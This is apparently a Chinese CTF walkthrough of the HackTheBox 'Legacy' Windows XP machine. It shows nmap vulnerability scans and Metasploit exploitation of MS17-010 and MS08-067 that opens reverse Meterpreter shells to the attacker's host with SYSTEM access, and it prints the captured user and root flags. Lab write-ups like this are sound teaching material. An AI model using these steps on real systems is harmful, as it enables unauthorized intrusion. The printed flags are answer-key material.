# Legacy

nmap扫：

```shell
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
```

大概率smb服务的洞，nmap可以扫漏洞：

```shell
20:03:48 › sudo nmap -p 445 --script=vuln 10.10.10.4
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-07 20:04 CST
Pre-scan script results:
| broadcast-avahi-dos:
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.4
Host is up (0.26s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)

```

发现ms17-010和ms08-067都可以利用。

先试ms17-010：

```shell
msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

```

其中auxiliary/scanner/smb/smb_ms17_010是检测是否存在的：

```shell
msf6 auxiliary(scanner/smb/smb_ms17_010) > exploit

[+] 10.10.10.4:445        - Host is likely VULNERABLE to MS17-010! - Windows 5.1 x86 (32-bit)
[*] 10.10.10.4:445        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

其余的几个攻击模块大部分都能打，随便选一个能打的打就可以：

```shell
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 10.10.14.28
LHOST => 10.10.14.28
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.28:4444
[*] 10.10.10.4:445 - Target OS: Windows 5.1
[*] 10.10.10.4:445 - Filling barrel with fish... done
[*] 10.10.10.4:445 - <---------------- | Entering Danger Zone | ---------------->
[*] 10.10.10.4:445 - 	[*] Preparing dynamite...
[*] 10.10.10.4:445 - 		[*] Trying stick 1 (x86)...Boom!
[*] 10.10.10.4:445 - 	[+] Successfully Leaked Transaction!
[*] 10.10.10.4:445 - 	[+] Successfully caught Fish-in-a-barrel
[*] 10.10.10.4:445 - <---------------- | Leaving Danger Zone | ---------------->
[*] 10.10.10.4:445 - Reading from CONNECTION struct at: 0x8603fb30
[*] 10.10.10.4:445 - Built a write-what-where primitive...
[+] 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.4:445 - Selecting native target
[*] 10.10.10.4:445 - Uploading payload... jzVMCadr.exe
[*] 10.10.10.4:445 - Created \jzVMCadr.exe...
[+] 10.10.10.4:445 - Service started successfully...
[*] 10.10.10.4:445 - Deleting \jzVMCadr.exe...
[*] Sending stage (175686 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.28:4444 -> 10.10.10.4:1032) at 2023-09-07 20:23:17 +0800

meterpreter >
```

Meterpreter 是 Metasploit 的一个扩展模块，可以调用 Metasploit 的一些功能，对目标系统进行更深入的渗透，如获取屏幕、上传/下载文件、创建持久后门等。具体操作见msf备忘录

```shell
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > search -f user.txt
Found 1 result...
=================

Path                                             Size (bytes)  Modified (UTC)
----                                             ------------  --------------
c:\Documents and Settings\john\Desktop\user.txt  32            2017-03-16 14:19:49 +0800

meterpreter > cat 'c:\Documents and Settings\john\Desktop\user.txt'
e69af0e4f443de7e36876fda4ec7644fmeterpreter > search -f root.txt
Found 1 result...
=================

Path                                                      Size (bytes)  Modified (UTC)
----                                                      ------------  --------------
c:\Documents and Settings\Administrator\Desktop\root.txt  32            2017-03-16 14:18:50 +0800

meterpreter > cat 'c:\Documents and Settings\Administrator\Desktop\root.txt'
993442d258b0e0ec917cae9e695d5713meterpreter >
```





再试试ms08-067：

```shell
msf6 exploit(windows/smb/ms08_067_netapi) > set rhost 10.10.10.4
rhost => 10.10.10.4
msf6 exploit(windows/smb/ms08_067_netapi) > set lhost 10.10.14.28
lhost => 10.10.14.28
msf6 exploit(windows/smb/ms08_067_netapi) > check
[+] 10.10.10.4:445 - The target is vulnerable.
msf6 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.14.28:4444
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175686 bytes) to 10.10.10.4
[*] Meterpreter session 2 opened (10.10.14.28:4444 -> 10.10.10.4:1034) at 2023-09-08 12:18:18 +0800

meterpreter >
```

可以成功打通
